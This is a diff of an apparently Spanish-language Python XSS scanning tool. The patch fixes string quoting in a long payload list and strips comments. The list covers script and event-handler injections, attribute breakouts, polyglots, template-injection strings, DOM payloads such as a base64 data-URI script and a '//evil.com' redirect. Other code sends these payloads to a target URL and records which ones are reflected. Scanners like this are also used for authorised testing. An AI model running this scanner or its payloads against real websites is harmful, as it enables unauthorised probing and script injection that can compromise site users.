@@ -52,18 +52,18 @@ def cargar_payloads():
         "<keygen onfocus=alert(1) autofocus>",
         
         # ===== ROMPIENDO ATRIBUTOS =====
-        "\"><script>alert(1)</script>",
+        '\"><script>alert(1)</script>',
         "'><script>alert(1)</script>",
-        "\"><img src=x onerror=alert(1)>",
+        '\"><img src=x onerror=alert(1)>',
         "'><img src=x onerror=alert(1)>",
-        "\"'><script>alert(1)</script>",
+        '\'"><script>alert(1)</script>',
         "</textarea><script>alert(1)</script>",
         "</title><script>alert(1)</script>",
         "</style><script>alert(1)</script>",
         "';alert(1);//",
-        "\";alert(1);//",
+        '";alert(1);//',
         "'-alert(1)-'",
-        "\"-alert(1)-\"",
+        '"-alert(1)-"',
         "><script>alert(1)</script>",
         "><img src=x onerror=alert(1)>",
         "><svg onload=alert(1)>",
@@ -88,9 +88,9 @@ def cargar_payloads():
         "&lt;script&gt;alert(1)&lt;/script&gt;",
         
         # ===== POLÍGLOTAS =====
-        "\"'><script>alert(1)</script><img src=x onerror=alert(1)>",
+        '\'"><script>alert(1)</script><img src=x onerror=alert(1)>',
         "javascript:/*--></title></style></textarea></script></xmp><svg onload='alert(1)'>",
-        "\"><svg/onload=alert(1)><img src=x onerror=alert(1)>",
+        '\"><svg/onload=alert(1)><img src=x onerror=alert(1)>',
         "'><svg/onload=alert(1)><img src=x onerror=alert(1)>",
         
         # ===== TEMPLATES =====
@@ -102,8 +102,8 @@ def cargar_payloads():
         "{php}echo 'XSS';{/php}",
         
         # ===== DOM =====
-        "#"><script>alert(1)</script>",
-        "//"><script>alert(1)</script>",
+        '#"><script>alert(1)</script>',
+        "//\"><script>alert(1)</script>",
         "javascript:alert(1)//",
         "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
     ]
@@ -114,12 +114,10 @@ def analizar_respuesta(response, payload):
     if payload in response.text:
         return True, "Reflejado exacto"
     
-    # Buscar payload decodificado
     decoded = payload.replace("%3C", "<").replace("%3E", ">").replace("%2F", "/")
     if decoded in response.text:
         return True, "Reflejado decodificado"
     
-    # Buscar parte del payload
     partes = payload.split(">")
     for parte in partes:
         if len(parte) > 10 and parte in response.text:
@@ -196,7 +194,7 @@ def test_dom(url, payloads, encontrados, archivo):
     print(f"\n{B}[*] Probando XSS basado en DOM{N}\n")
     
     dom_payloads = [
-        "#"><script>alert(1)</script>",
+        '#"><script>alert(1)</script>',
         "javascript:alert(1)",
         "data:text/html,<script>alert(1)</script>",
         "//evil.com",
@@ -239,15 +237,12 @@ def main():
     if not url.startswith("http"):
         url = "http://" + url
     
-    # Info del objetivo
     if not info_objetivo(url):
         return
     
-    # Cargar payloads
     payloads = cargar_payloads()
     print(f"[*] Payloads cargados: {len(payloads)}\n")
     
-    # Archivo de resultados
     ts = datetime.now().strftime('%Y%m%d_%H%M%S')
     nombre_archivo = f"xss_scan_{url.replace('://', '_').replace('/', '_')[:30]}_{ts}.txt"
     encontrados = []
@@ -258,7 +253,6 @@ def main():
         f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write(f"{'='*50}\n\n")
         
-        # Tests
         test_reflected(url, payloads, encontrados, f)
         test_stored(url, payloads, encontrados, f)
         test_dom(url, payloads, encontrados, f)
@@ -266,7 +260,6 @@ def main():
         f.write(f"\n{'='*50}\n")
         f.write(f"Total: {len(encontrados)} vulnerabilidades\n")
     
-    # Resumen final
     print(f"\n{C}{B}{'='*50}{N}")
     print(f"{C}{B}   RESULTADOS FINALES{N}")
     print(f"{C}{'='*50}{N}")
